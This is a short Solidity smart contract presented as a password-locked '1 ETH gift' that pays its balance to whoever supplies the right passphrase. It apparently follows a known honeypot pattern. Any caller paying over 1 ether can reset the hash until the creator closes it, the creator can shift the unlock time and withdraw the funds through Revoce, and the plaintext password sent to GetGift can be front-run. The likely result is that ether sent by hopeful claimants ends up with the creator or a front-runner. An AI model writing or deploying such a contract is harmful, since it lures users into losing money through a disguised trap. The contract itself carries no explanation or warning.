1 pragma solidity ^0.4.19;
2 
3 contract GIFT_1_ETH
4 {
5     bytes32 public hashPass;
6     
7     bool closed = false;
8     
9     address sender;
10  
11     uint unlockTime;
12  
13     function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
14     
15     function SetPass(bytes32 hash)
16     public
17     payable
18     {
19         if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
20         {
21             hashPass = hash;
22             sender = msg.sender;
23             unlockTime = now;
24         }
25     }
26     
27     function SetGiftTime(uint date)
28     public
29     {
30         if(msg.sender==sender)
31         {
32             unlockTime = date;
33         }
34     }
35     
36     function GetGift(bytes pass)
37     external
38     payable
39     canOpen
40     {
41         if(hashPass == keccak256(pass))
42         {
43             msg.sender.transfer(this.balance);
44         }
45     }
46     
47     function Revoce()
48     public
49     payable
50     canOpen
51     {
52         if(msg.sender==sender)
53         {
54             sender.transfer(this.balance);
55         }
56     }
57     
58     function PassHasBeenSet(bytes32 hash)
59     public
60     {
61         if(hash==hashPass&&msg.sender==sender)
62         {
63            closed=true;
64         }
65     }
66     
67     modifier canOpen
68     {
69         require(now>unlockTime);
70         _;
71     }
72     
73     function() public payable{}
74     
75 }